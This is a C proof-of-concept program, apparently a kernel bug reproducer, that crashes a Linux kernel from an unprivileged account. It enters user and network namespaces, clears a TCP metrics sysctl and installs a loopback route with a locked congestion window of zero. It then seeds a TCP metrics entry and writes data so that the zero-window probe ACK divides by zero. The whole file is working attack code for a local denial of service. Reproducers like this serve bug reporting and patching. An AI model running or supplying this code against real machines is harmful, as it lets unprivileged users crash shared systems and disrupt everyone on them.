// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>

#ifndef TCP_CONGESTION
#define TCP_CONGESTION 13
#endif
#ifndef TCP_INFO
#define TCP_INFO 11
#endif
#ifndef TCP_NODELAY
#define TCP_NODELAY 1
#endif

#define SRV_ADDR "127.0.0.2"
#define CLI_ADDR "127.0.0.1"
#define SRV_PORT 31337

static void die(const char *m) { perror(m); exit(1); }

static void wfile(const char *p, const char *s)
{
	int fd = open(p, O_WRONLY);
	if (fd < 0)
		return;
	write(fd, s, strlen(s));
	close(fd);
}

static void enter_ns(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();
	char buf[64];

	if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET |
		    CLONE_NEWPID) != 0)
		die("unshare");

	snprintf(buf, sizeof(buf), "0 %d 1\n", uid);
	wfile("/proc/self/uid_map", buf);
	wfile("/proc/self/setgroups", "deny");
	snprintf(buf, sizeof(buf), "0 %d 1\n", gid);
	wfile("/proc/self/gid_map", buf);
}

static int drop_no_ssthresh_save(void)
{
	mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
	mkdir("./nsproc", 0755);
	if (mount("proc", "./nsproc", "proc", 0, NULL) != 0) {
		perror("[-] mount proc");
		return -1;
	}
	wfile("./nsproc/sys/net/ipv4/tcp_no_ssthresh_metrics_save", "0\n");
	{
		char b[8] = {0};
		int fd = open("./nsproc/sys/net/ipv4/"
			      "tcp_no_ssthresh_metrics_save", O_RDONLY);
		if (fd >= 0) {
			read(fd, b, sizeof(b) - 1);
			close(fd);
		}
		printf("[+] tcp_no_ssthresh_metrics_save = %s", b);
		if (b[0] != '0')
			return -1;
	}
	return 0;
}

static void lo_up(void)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket");
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		die("SIOCGIFFLAGS");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		die("SIOCSIFFLAGS");
	close(fd);
}

static void nla_put_raw(struct nlmsghdr *n, int maxlen, int type,
			const void *data, int len)
{
	struct rtattr *rta;
	int alen = RTA_LENGTH(len);

	if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(alen) > (unsigned)maxlen) {
		fprintf(stderr, "nla overflow\n");
		exit(1);
	}
	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = alen;
	if (len)
		memcpy(RTA_DATA(rta), data, len);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(alen);
}

static void nla_put_u32(struct nlmsghdr *n, int maxlen, int type, __u32 v)
{
	nla_put_raw(n, maxlen, type, &v, sizeof(v));
}

static int add_route_with_metrics(void)
{
	char buf[1024];
	struct nlmsghdr *n = (struct nlmsghdr *)buf;
	struct rtmsg *r;
	struct rtattr *mx;
	struct sockaddr_nl sa;
	struct in_addr dst, src;
	int fd, ret;
	char rbuf[4096];

	memset(buf, 0, sizeof(buf));
	n->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	n->nlmsg_type = RTM_NEWROUTE;
	n->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
	n->nlmsg_seq = 1;

	r = (struct rtmsg *)NLMSG_DATA(n);
	r->rtm_family = AF_INET;
	r->rtm_dst_len = 32;
	r->rtm_src_len = 0;
	r->rtm_tos = 0;
	r->rtm_table = RT_TABLE_LOCAL;
	r->rtm_protocol = RTPROT_BOOT;
	r->rtm_scope = RT_SCOPE_HOST;
	r->rtm_type = RTN_LOCAL;
	r->rtm_flags = 0;

	inet_pton(AF_INET, SRV_ADDR, &dst);
	inet_pton(AF_INET, CLI_ADDR, &src);
	nla_put_raw(n, sizeof(buf), RTA_DST, &dst, 4);
	nla_put_raw(n, sizeof(buf), RTA_PREFSRC, &src, 4);
	nla_put_u32(n, sizeof(buf), RTA_OIF, if_nametoindex("lo"));

	mx = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	mx->rta_type = RTA_METRICS;
	mx->rta_len = RTA_LENGTH(0);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(RTA_LENGTH(0));

	nla_put_u32(n, sizeof(buf), RTAX_LOCK,
		    (1u << RTAX_CWND) | (1u << RTAX_SSTHRESH));
	nla_put_u32(n, sizeof(buf), RTAX_CWND, 0);
	nla_put_u32(n, sizeof(buf), RTAX_SSTHRESH, 10);

	mx->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)mx;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("netlink socket");
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("netlink bind");
	if (send(fd, buf, n->nlmsg_len, 0) < 0)
		die("netlink send");

	ret = recv(fd, rbuf, sizeof(rbuf), 0);
	if (ret > 0) {
		struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
		if (rh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);
			if (e->error) {
				fprintf(stderr, "[-] RTM_NEWROUTE: %s\n",
					strerror(-e->error));
				close(fd);
				return -1;
			}
		}
	}
	close(fd);
	printf("[+] route 'local %s/32 dev lo table local' installed with "
	       "locked cwnd=0 ssthresh=10\n", SRV_ADDR);
	return 0;
}

static int listen_fd;

static void *server_thread(void *unused)
{
	for (;;) {
		int c = accept(listen_fd, NULL, NULL);
		char b[4096];
		if (c < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		for (;;) {
			int n = read(c, b, sizeof(b));
			if (n <= 0)
				break;
		}
		close(c);
	}
	return NULL;
}

static void start_server(void)
{
	struct sockaddr_in sa;
	int one = 1;
	pthread_t t;

	listen_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_fd < 0)
		die("server socket");
	setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(SRV_PORT);
	inet_pton(AF_INET, SRV_ADDR, &sa.sin_addr);
	if (bind(listen_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("server bind");
	if (listen(listen_fd, 16) < 0)
		die("listen");
	pthread_create(&t, NULL, server_thread, NULL);
}

static int client_connect(int reno)
{
	struct sockaddr_in sa, la;
	int fd = socket(AF_INET, SOCK_STREAM, 0);

	if (fd < 0)
		die("client socket");
	if (reno) {

		if (setsockopt(fd, IPPROTO_TCP, TCP_CONGESTION, "reno", 4) < 0)
			perror("[-] TCP_CONGESTION reno");
	}
	memset(&la, 0, sizeof(la));
	la.sin_family = AF_INET;
	la.sin_port = 0;
	inet_pton(AF_INET, CLI_ADDR, &la.sin_addr);
	if (bind(fd, (struct sockaddr *)&la, sizeof(la)) < 0)
		die("client bind");

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(SRV_PORT);
	inet_pton(AF_INET, SRV_ADDR, &sa.sin_addr);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("connect");
	return fd;
}

int main(void)
{
	int fd;
	struct tcp_info ti;
	socklen_t tilen = sizeof(ti);
	char payload[64];

	setvbuf(stdout, NULL, _IONBF, 0);

	enter_ns();

	{
		pid_t p = fork();
		int st;
		if (p < 0)
			die("fork");
		if (p > 0) {
			waitpid(p, &st, 0);
			return 0;
		}
	}

	if (drop_no_ssthresh_save() != 0)
		return 1;
	lo_up();
	if (add_route_with_metrics() != 0)
		return 1;

	start_server();
	usleep(200000);

	fd = client_connect(0);
	write(fd, "a", 1);
	usleep(200000);
	close(fd);
	printf("[+] connection #1 closed, tcp_metrics entry seeded\n");
	sleep(1);

	fd = client_connect(1);
	memset(&ti, 0, sizeof(ti));
	if (getsockopt(fd, IPPROTO_TCP, TCP_INFO, &ti, &tilen) == 0)
		printf("[+] connection #2 established: tcpi_snd_cwnd=%u "
		       "tcpi_snd_ssthresh=%u\n",
		       ti.tcpi_snd_cwnd, ti.tcpi_snd_ssthresh);

	{
		int one = 1;
		setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	}

	memset(payload, 'A', sizeof(payload));
	printf("[*] writing with snd_cwnd == 0; the zero-window probe timer "
	       "will push the segment out and its ACK divides by zero...\n");
	write(fd, payload, sizeof(payload));

	sleep(15);
	printf("[-] no crash\n");
	close(fd);
	return 0;
}
